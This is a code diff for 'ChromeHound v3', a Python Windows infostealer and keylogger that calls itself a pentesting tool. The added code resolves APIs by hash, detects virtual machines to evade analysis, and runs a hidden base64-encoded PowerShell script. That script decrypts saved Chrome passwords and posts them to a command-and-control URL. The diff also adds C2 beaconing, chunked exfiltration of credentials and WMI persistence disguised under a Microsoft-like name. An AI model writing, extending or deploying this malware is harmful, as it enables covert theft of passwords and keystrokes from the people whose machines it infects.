@@ -1,6 +1,6 @@
 """
 ChromeHound v3 — Fixed Raw Input + Full Evasion
-Authorized pentesting tool. No comments in production build.
+Authorized pentesting tool.
 """
 import ctypes, ctypes.wintypes, json, os, sys, time, threading, random, struct, base64, subprocess
 
@@ -27,6 +27,69 @@ class WinAPI:
         f = ctypes.CFUNCTYPE(restype, *argtypes)(addr) if argtypes else ctypes.CFUNCTYPE(restype)(addr)
         return f
 
+    @classmethod
+    def fn_hash(cls, mod, hash_val, restype=ctypes.c_int, *argtypes):
+        h = cls._mod(mod)
+        if not h:
+            return None
+        dos = ctypes.c_uint32.from_address(h).value
+        e_lfanew = ctypes.c_uint32.from_address(h + 0x3C).value
+        optional = h + e_lfanew + 0x18
+        export_rva = ctypes.c_uint32.from_address(optional + 0x60).value
+        if not export_rva:
+            return None
+        exp = h + export_rva
+        n_names = ctypes.c_uint32.from_address(exp + 0x18).value
+        addr_of_funcs = ctypes.c_uint32.from_address(exp + 0x1C).value
+        addr_of_names = ctypes.c_uint32.from_address(exp + 0x20).value
+        addr_of_ordinals = ctypes.c_uint32.from_address(exp + 0x24).value
+        for i in range(n_names):
+            name_rva = ctypes.c_uint32.from_address(h + addr_of_names + i * 4).value
+            fname = ctypes.c_char_p(h + name_rva).value
+            if fname:
+                hval = 0
+                for c in fname:
+                    hval = (hval * 0x1003 + c) & 0xFFFFFFFF
+                if hval == hash_val:
+                    ordinal = ctypes.c_uint16.from_address(h + addr_of_ordinals + i * 2).value
+                    func_rva = ctypes.c_uint32.from_address(h + addr_of_funcs + ordinal * 4).value
+                    addr = h + func_rva
+                    f = ctypes.CFUNCTYPE(restype, *argtypes)(addr) if argtypes else ctypes.CFUNCTYPE(restype)(addr)
+                    return f
+        return None
+
+
+def _check_env():
+    GetFirmware = WinAPI.fn("kernel32.dll", "GetSystemFirmwareTable", ctypes.c_uint32, 
+                           ctypes.c_uint32, ctypes.c_uint32, ctypes.c_void_p, ctypes.c_uint32)
+    if GetFirmware:
+        size = GetFirmware(0x4e, 1, None, 0) 
+        if size:
+            buf = ctypes.create_string_buffer(size)
+            GetFirmware(0x4e, 1, buf, size)
+            data = buf.raw
+            for sig in [b"VMware", b"Virtual", b"VBOX", b"QEMU", b"Parallels", b"KVM"]:
+                if sig in data:
+                    time.sleep(random.uniform(10, 30))
+                    return True
+    GetDiskFree = WinAPI.fn("kernel32.dll", "GetDiskFreeSpaceExW", ctypes.c_int,
+                           ctypes.c_wchar_p, ctypes.POINTER(ctypes.c_ulonglong),
+                           ctypes.POINTER(ctypes.c_ulonglong), ctypes.POINTER(ctypes.c_ulonglong))
+    if GetDiskFree:
+        free = ctypes.c_ulonglong()
+        total = ctypes.c_ulonglong()
+        GetDiskFree("C:\\", ctypes.byref(free), ctypes.byref(total), None)
+        if total.value < 50000000000:
+            time.sleep(random.uniform(8, 15))
+            return True
+    GetTick = WinAPI.fn("kernel32.dll", "GetTickCount", ctypes.c_uint32)
+    if GetTick and GetTick() < 300000:
+        time.sleep(random.uniform(10, 20))
+        return True
+    return False
+
+
+# === FIX: Proper WNDCLASSW structure ===
 class WNDCLASSW(ctypes.Structure):
     _fields_ = [
         ("style",        ctypes.c_uint32),
@@ -40,6 +103,7 @@ class WNDCLASSW(ctypes.Structure):
         ("lpszMenuName", ctypes.c_wchar_p),
         ("lpszClassName",ctypes.c_wchar_p),
     ]
+
 
 class RawKeylogger:
     def __init__(self):
@@ -177,7 +241,7 @@ class RawKeylogger:
                                      ctypes.c_uint32, ctypes.c_uint32)
         wndproc = WNDPROC(self._window_proc)
 
-        # --- FIX: Use proper WNDCLASSW structure ---
+        # --- THIS IS THE FIX ---
         wc = WNDCLASSW()
         wc.style = 0
         wc.lpfnWndProc = ctypes.cast(wndproc, ctypes.c_void_p)
@@ -193,6 +257,7 @@ class RawKeylogger:
 
         atom = ctypes.windll.user32.RegisterClassW(ctypes.byref(wc))
         if not atom:
+            print("RegisterClassW failed")
             return False
 
         hwnd = self._CreateWindowExW(0, "RawInputLoggerClass", "", 0,
@@ -222,3 +287,94 @@ class RawKeylogger:
                 self._DestroyWindow(self._hwnd)
             except:
                 pass
+
+
+def _steal_chrome_powershell(c2_url):
+    ps_script = """$r=[System.Reflection.Assembly]::LoadWithPartialName('System.Security');$p=[Environment]::GetFolderPath('LocalApplicationData')+'\\Google\\Chrome\\User Data\\';$s=Get-Content($p+'Local State')|ConvertFrom-Json;$k=[System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($s.os_crypt.encrypted_key)[5..9999],$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);$db=$p+'Default\\Login Data';$t=$env:TEMP+'\\ld.tmp';Copy-Item $db $t -Force;$c=New-Object System.Data.SQLite.SQLiteConnection"Data Source=$t";$c.Open();$q=$c.CreateCommand();$q.CommandText='SELECT origin_url,username_value,password_value FROM logins';$r=$q.ExecuteReader();$o=@();while($r.Read()){$u=$r.GetString(0);$n=$r.GetString(1);$e=[byte[]]$r[2];if($e.Length -gt 15){$iv=$e[3..14];$ct=$e[15..($e.Length-17)];$tag=$e[-16..-1];$a=[System.Security.Cryptography.AesGcm]::new($k,16);$p=[byte[]]::new($ct.Length);$a.Decrypt($iv,$ct,$tag,$p);$o+=[PSCustomObject]@{url=$u;user=$n;pass=[System.Text.Encoding]::UTF8.GetString($p)}}$r.Close();$c.Close();$j=$o|ConvertTo-Json -Compress;$web=New-Object Net.WebClient;$web.Headers.Add('Content-Type','application/json');$web.UploadString('%s','POST',$j)"""
+    cmd = ps_script % c2_url
+    cmd_bytes = cmd.encode('utf-16-le')
+    cmd_b64 = base64.b64encode(cmd_bytes).decode()
+    si = subprocess.STARTUPINFO()
+    si.dwFlags = subprocess.STARTF_USESHOWWINDOW
+    si.wShowWindow = 0
+    try:
+        subprocess.run(
+            ["powershell.exe", "-NoProfile", "-NonInteractive", "-EncodedCommand", cmd_b64],
+            startupinfo=si,
+            capture_output=True,
+            timeout=30
+        )
+    except:
+        pass
+
+
+class C2:
+    def __init__(self, endpoint):
+        self._endpoint = endpoint
+        self._hostname = os.environ.get("COMPUTERNAME", "UNKNOWN")
+        self._username = os.environ.get("USERNAME", "UNKNOWN")
+    
+    def beacon(self):
+        try:
+            import urllib.request
+            data = json.dumps({"type":"beacon","host":self._hostname,"user":self._username,"pid":os.getpid()}).encode()
+            req = urllib.request.Request(self._endpoint+"/beacon",data=data,headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})
+            urllib.request.urlopen(req, timeout=5)
+        except:
+            pass
+    
+    def send_creds(self, creds):
+        if not creds:
+            return
+        try:
+            import urllib.request
+            chunks = [creds[i:i+50] for i in range(0, len(creds), 50)]
+            for chunk in chunks:
+                data = json.dumps({"type":"creds","host":self._hostname,"user":self._username,"data":chunk}).encode()
+                req = urllib.request.Request(self._endpoint+"/exfil",data=data,headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})
+                urllib.request.urlopen(req, timeout=5)
+                time.sleep(random.uniform(1, 3))
+        except:
+            pass
+
+
+def _install_persistence():
+    wmi_script = (
+        'wmic /NAMESPACE:\\\\root\\subscription PATH __EventFilter CREATE '
+        'Name="MSFTEdgeDiag", EventNameSpace="root\\cimv2", '
+        'QueryLanguage="WQL", '
+        'Query="SELECT * FROM __InstanceModificationEvent WITHIN 86400 '
+        'WHERE TargetInstance ISA \'Win32_ComputerSystem\'"'
+    )
+    try:
+        subprocess.run(wmi_script, shell=True, capture_output=True, timeout=10)
+    except:
+        pass
+
+
+def main():
+    if _check_env():
+        return
+
+    C2_URL = "https://your-c2-endpoint.com/api"
+
+    _install_persistence()
+
+    c2 = C2(C2_URL)
+    c2.beacon()
+
+    kl = RawKeylogger()
+    kl_thread = threading.Thread(target=kl.start, args=(C2_URL,), daemon=True)
+    kl_thread.start()
+    
+    time.sleep(random.uniform(20, 40))
+    _steal_chrome_powershell(C2_URL)
+    
+    try:
+        while True:
+            time.sleep(60)
+    except KeyboardInterrupt:
+        kl.stop()
+
+if __name__ == "__main__":
+    main()
